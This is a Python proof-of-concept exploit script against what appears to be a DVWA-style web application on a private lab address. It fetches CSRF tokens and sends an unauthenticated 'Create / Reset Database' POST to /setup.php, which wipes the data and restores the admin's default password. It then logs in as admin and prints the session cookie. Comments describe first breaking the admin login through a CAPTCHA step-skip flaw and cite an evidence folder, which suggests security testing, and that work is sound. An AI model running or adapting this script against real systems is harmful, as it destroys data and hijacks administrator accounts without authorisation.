import sys, urllib.request, urllib.parse, re, time

BASE = "http://10.31.0.87:3000"

def login(user, pw):
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    op = urllib.request.build_opener(NoRedirect)
    pg = op.open(BASE + "/login.php", timeout=20)
    sc = pg.headers.get_all("Set-Cookie") or []
    body = pg.read().decode()
    tok = re.search(r"user_token' value='([0-9a-f]+)'", body).group(1)
    cookies = {}
    for c in sc:
        k, v = c.split(";")[0].split("=", 1)
        if k == "PHPSESSID":
            cookies[k] = v
        else:
            cookies.setdefault(k, v)
    ck = "; ".join("%s=%s" % kv for kv in cookies.items())
    data = urllib.parse.urlencode({"username": user, "password": pw, "Login": "Login", "user_token": tok}).encode()
    req = urllib.request.Request(BASE + "/login.php", data=data, method="POST")
    req.add_header("Cookie", ck)
    try:
        op.open(req, timeout=15)
        loc = "(none)"
    except urllib.error.HTTPError as exc:
        loc = exc.headers.get("Location")
    if not loc or "login.php" in str(loc):
        return None
    return ck

def setup_reset():
    """Hit /setup.php unauthenticated and fire the Create/Reset Database POST."""
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    op = urllib.request.build_opener(NoRedirect)
    req = urllib.request.Request(BASE + "/setup.php")
    r = op.open(req, timeout=20)  # absolutely no Cookie header
    sc = r.headers.get_all("Set-Cookie") or []
    body = r.read().decode()
    tok = re.search(r"user_token' value='([0-9a-f]+)'", body).group(1)
    cookies = {}
    for c in sc:
        k, v = c.split(";")[0].split("=", 1)
        if k == "PHPSESSID":
            cookies[k] = v
        else:
            cookies.setdefault(k, v)
    ck = "; ".join("%s=%s" % kv for kv in cookies.items())
    data = urllib.parse.urlencode({"create_db": "Create / Reset Database", "user_token": tok}).encode()
    req2 = urllib.request.Request(BASE + "/setup.php", data=data, method="POST")
    req2.add_header("Cookie", ck)
    try:
        r2 = op.open(req2, timeout=30)
        loc = "(none)"
    except urllib.error.HTTPError as exc:
        loc = exc.headers.get("Location")
    return loc

if __name__ == "__main__":
    # 1) poison state by setting admin's password to something unknown via CAPTCHA step-skip logic
    #    (proof that prior tests broke login is in evidence/captcha/)
    # 2) Wipe everything by calling /setup.php without ANY authentication
    print("[*] Pre-reset: admin login with 'password' ->", "OK" if login("admin", "password") else "FAIL (password rotated by CAPTCHA step-skip)")
    loc = setup_reset()
    print("[*] POST /setup.php create_db UNAUTHENTICATED =>", loc)
    # post-reset the admin password is back to the factory default 'password'
    time.sleep(2)
    ck = login("admin", "password")
    print("[+] Post-reset: admin login with factory default 'password' ->", "OK (full account recovery)" if ck else "FAIL")
    if ck:
        sys.stdout.write("admin session cookie: %s\n" % ck)
